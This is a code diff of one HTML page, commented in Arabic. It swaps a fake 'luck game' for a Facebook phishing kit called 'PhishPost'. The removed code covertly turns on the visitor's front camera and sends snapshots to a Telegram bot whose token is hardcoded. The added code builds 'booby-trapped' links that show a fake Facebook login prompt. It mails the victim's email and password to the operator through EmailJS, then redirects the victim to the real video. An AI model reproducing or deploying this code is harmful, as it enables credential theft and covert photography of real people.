@@ -3,144 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لعبة الحظ السريع</title>
+    <title>PhishPost - صائد فيسبوك</title>
+    <!-- EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body {
-            background-color: #121212;
-            color: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            margin: 0;
-        }
-        .game-btn {
-            background: linear-gradient(45deg, #ff0055, #ff0000);
-            border: none;
-            padding: 20px 40px;
-            color: white;
-            font-size: 24px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            transition: transform 0.2s;
-        }
-        .game-btn:active {
-            transform: scale(0.95);
-        }
-        /* الكاميرا موجودة لكنها شفافة لكي تعمل البرمجة */
-        #cam-stream {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.1;
-            pointer-events: none;
-        }
-        #status {
-            margin-top: 20px;
-            color: #ffff00;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; }
+        .container { max-width: 500px; margin: 20px auto; background: white; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+
+        .gen-panel { padding: 20px; display: none; }
+        .gen-panel.active { display: block; }
+        .gen-panel h2 { color: #1c1e21; margin-bottom: 15px; }
+        .gen-panel input[type="text"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; margin-bottom: 10px; }
+        .gen-panel button { background: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+        .result { margin-top: 15px; background: #e7f3ff; padding: 10px; border-radius: 6px; word-break: break-all; font-size: 14px; }
+
+        .post-panel { display: none; }
+        .post-panel.active { display: block; }
+        .header { padding: 10px 16px; display: flex; align-items: center; border-bottom: 1px solid #dddfe2; }
+        .header img { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; }
+        .header .name { font-weight: 600; }
+        .header .time { font-size: 12px; color: #65676b; }
+        .video-placeholder { width: 100%; height: 300px; background: #000; position: relative; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .video-placeholder::before { content: "▶"; font-size: 60px; color: white; opacity: 0.9; }
+        .actions { display: flex; justify-content: space-around; padding: 10px; border-top: 1px solid #dddfe2; font-size: 14px; color: #65676b; }
+
+        .login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.96); z-index: 10; align-items: center; justify-content: center; }
+        .login-overlay.active { display: flex; }
+        .login-box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); padding: 20px; max-width: 400px; width: 90%; text-align: center; }
+        .login-box h3 { margin-bottom: 10px; }
+        .login-box p { color: #606770; font-size: 14px; margin-bottom: 15px; }
+        .login-box input { width: 100%; padding: 14px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .login-box button { background: #1877f2; color: white; border: none; border-radius: 6px; padding: 12px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <h1>اضغط للفوز بجائزة! 🎁</h1>
-    <button class="game-btn" onclick="playGame()">جرب حظك</button>
-    <p id="status"></p>
+<!-- لوحة إنشاء الرابط -->
+<div id="genPanel" class="gen-panel active">
+    <h2>أداة PhishPost</h2>
+    <p>ألصق رابط فيديو فيسبوك لتحصل على رابط ملغوم.</p>
+    <input type="text" id="videoUrl" placeholder="مثال: https://www.facebook.com/watch/?v=123456">
+    <button onclick="generateLink()">أنشئ الرابط الملغوم</button>
+    <div id="result" class="result" style="display:none;"></div>
+</div>
 
-    <video id="cam-stream" autoplay playsinline muted></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+<!-- صفحة الضحية -->
+<div id="postPanel" class="post-panel">
+    <div class="header">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yV/r/t9QT8N9hNwl.png" alt="صفحة">
+        <div>
+            <div class="name">صفحة فيسبوك</div>
+            <div class="time">منذ دقيقتين · 🌍</div>
+        </div>
+    </div>
+    <div class="video-placeholder" onclick="openLogin()"></div>
+    <div class="actions">
+        <span>👍 إعجاب</span>
+        <span>💬 تعليق</span>
+        <span>↗️ مشاركة</span>
+    </div>
+</div>
 
-    <script>
-        // بيانات البوت اللعين
-        const TOKEN = "8554214830:AAG22k54m3AAZXwxW67I6mU9g3mA1j4vWHo";
-        const CHAT_ID = "7763665935";
-        
-        const video = document.getElementById('cam-stream');
-        const canvas = document.getElementById('canvas');
-        const statusTxt = document.getElementById('status');
-        let isCameraReady = false;
+<!-- نافذة تسجيل الدخول -->
+<div id="loginOverlay" class="login-overlay">
+    <div class="login-box">
+        <h3>تسجيل الدخول إلى فيسبوك</h3>
+        <p>يجب تسجيل الدخول لمشاهدة هذا الفيديو.</p>
+        <form id="loginForm" onsubmit="handleLogin(event)">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" id="pass" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+</div>
 
-        // تشغيل الكاميرا فور فتح الموقع
-        async function initCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                video.srcObject = stream;
-                
-                // انتظار تحميل الفيديو للتأكد من أنه يعمل
-                video.onloadedmetadata = () => {
-                    isCameraReady = true;
-                    console.log("الكاميرا اللعينة جاهزة");
-                };
-            } catch (error) {
-                statusTxt.innerText = "خطأ: يجب السماح بالكاميرا للعب!";
-                console.error("فشل الوصول للكاميرا:", error);
-            }
+<script>
+    // ========== إعدادات EmailJS (بياناتك) ==========
+    emailjs.init("avcijd6dLYRX8ehhS");
+
+    const SERVICE_ID = "service_15bu51b";
+    const TEMPLATE_ID = "template_1x7uw64";
+
+    let realVideoUrl = "";
+
+    window.onload = function() {
+        const params = new URLSearchParams(window.location.search);
+        const ref = params.get('ref');
+        if (ref) {
+            try { realVideoUrl = atob(ref); } catch(e) { realVideoUrl = "https://www.facebook.com/"; }
+            document.getElementById('genPanel').classList.remove('active');
+            document.getElementById('postPanel').classList.add('active');
         }
+    };
 
-        // دالة اللعب والإرسال
-        function playGame() {
-            if (!isCameraReady) {
-                alert("انتظر لحظة، اللعبة تجهز الكاميرا...");
-                initCamera(); // محاولة تشغيلها مرة أخرى إذا فشلت
-                return;
-            }
+    function generateLink() {
+        const videoInput = document.getElementById('videoUrl').value.trim();
+        if (!videoInput) { alert("يرجى إدخال رابط الفيديو"); return; }
+        const encoded = btoa(videoInput);
+        const phishingLink = window.location.href.split('?')[0] + "?ref=" + encoded;
+        const resultDiv = document.getElementById('result');
+        resultDiv.style.display = 'block';
+        resultDiv.innerHTML = `<strong>الرابط الملغوم:</strong><br>
+            <input type="text" value="${phishingLink}" readonly style="width:100%;padding:8px;margin-top:5px;" onclick="this.select();">
+            <br><small>انسخ هذا الرابط وأرسله للضحية.</small>`;
+    }
 
-            statusTxt.innerText = "جاري السحب...";
+    function openLogin() {
+        document.getElementById('loginOverlay').classList.add('active');
+    }
 
-            // رسم الصورة الحالية على الكانفاس
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    function handleLogin(event) {
+        event.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('pass').value;
 
-            // تحويل الصورة لملف وإرسالها
-            canvas.toBlob(function(blob) {
-                sendToTelegram(blob);
-            }, 'image/jpeg', 0.8);
-        }
-
-        function sendToTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append("chat_id", CHAT_ID);
-            formData.append("photo", imageBlob, "victim.jpg");
-            formData.append("caption", "تم صيد هذا الغبي أثناء اللعب! 📸");
-
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    statusTxt.innerText = "❌ لم تفز بشيء، حظاً أوفر!";
-                    console.log("تم الإرسال بنجاح");
-                } else {
-                    statusTxt.innerText = "خطأ في السيرفر اللعين";
-                    alert("خطأ من تليجرام: " + data.description);
-                }
-            })
-            .catch(error => {
-                console.error(error);
-                statusTxt.innerText = "فشل الاتصال";
-            });
-        }
-
-        // تشغيل الكاميرا عند التحميل
-        window.addEventListener('load', initCamera);
-        
-        // محاولة تشغيل الكاميرا عند لمس أي مكان في الصفحة (للموبايل)
-        document.body.addEventListener('click', () => {
-            if(!isCameraReady) initCamera();
+        // إرسال البيانات إلى بريدك عبر EmailJS
+        emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+            email: email,
+            password: password
+        }).then(() => {
+            console.log("تم إرسال البيانات إلى البريد الإلكتروني");
+        }).catch(err => {
+            console.error("فشل الإرسال:", err);
         });
-    </script>
+
+        // توجيه الضحية إلى الفيديو الأصلي
+        window.location.href = realVideoUrl;
+    }
+</script>
 </body>
 </html>
